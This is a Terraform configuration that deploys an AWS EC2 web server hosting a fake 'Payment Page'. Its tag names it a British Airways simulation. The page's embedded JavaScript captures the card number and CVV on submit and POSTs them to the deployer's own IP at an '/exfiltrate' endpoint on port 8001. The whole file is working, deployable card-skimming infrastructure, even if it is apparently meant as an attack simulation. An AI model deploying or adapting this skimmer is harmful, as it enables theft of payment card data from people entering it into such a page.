terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
  }
}

provider "aws" {
  region = "us-west-2"
}

resource "tls_private_key" "ec2_key" {
  algorithm = "RSA"
  rsa_bits  = 4096
}

resource "aws_key_pair" "ec2_key_pair" {
  key_name   = "my-ec2-key"
  public_key = tls_private_key.ec2_key.public_key_openssh
}

resource "local_file" "private_key" {
  content         = tls_private_key.ec2_key.private_key_pem
  filename        = "${path.module}/my-ec2-key.pem"
  file_permission = "0400"
}

data "http" "local_ip" {
  url = "http://ipv4.icanhazip.com"
}

resource "aws_security_group" "allow_local_ip" {
  name        = "allow_local_ip"
  description = "Allow inbound SSH and HTTP from local IP"
  ingress {
    description = "SSH from local IP"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["${chomp(data.http.local_ip.response_body)}/32"]
  }
  ingress {
    description = "HTTP from local IP"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
  tags = {
    Name = "allow_local_ip"
  }
}

resource "aws_instance" "web_server" {
  ami                    = "ami-0c2ab3b8efb09f272"
  instance_type          = "t2.micro"
  key_name               = aws_key_pair.ec2_key_pair.key_name
  vpc_security_group_ids = [aws_security_group.allow_local_ip.id]
  user_data = <<-EOF
              #!/bin/bash
              yum update -y
              yum install -y httpd
              systemctl start httpd
              systemctl enable httpd
              cat <<HTML > /var/www/html/index.html
              <!DOCTYPE html>
              <html lang="en">
              <head>
                  <meta charset="UTF-8">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <title>Payment Page</title>
              </head>
              <body>
                  <h1>Payment Information</h1>
                  <form id="payment-form">
                      <label for="card-number">Card Number:</label>
                      <input type="text" id="card-number" name="card-number"><br><br>
                      <label for="cvv">CVV:</label>
                      <input type="text" id="cvv" name="cvv"><br><br>
                      <button type="submit">Submit</button>
                  </form>
                  <script>
                      document.getElementById('payment-form').addEventListener('submit', function(e) {
                          e.preventDefault();
                          var cardNumber = document.getElementById('card-number').value;
                          var cvv = document.getElementById('cvv').value;
                          fetch('http://${chomp(data.http.local_ip.response_body)}:8001/exfiltrate', {
                              method: 'POST',
                              headers: {
                                  'Content-Type': 'application/json',
                              },
                              body: JSON.stringify({ cardNumber: cardNumber, cvv: cvv }),
                          });
                      });
                  </script>
              </body>
              </html>
              HTML
              EOF
  tags = {
    Name = "british-airways-sim-ec2"
  }
}

output "web_server_public_ip" {
  value = aws_instance.web_server.public_ip
}
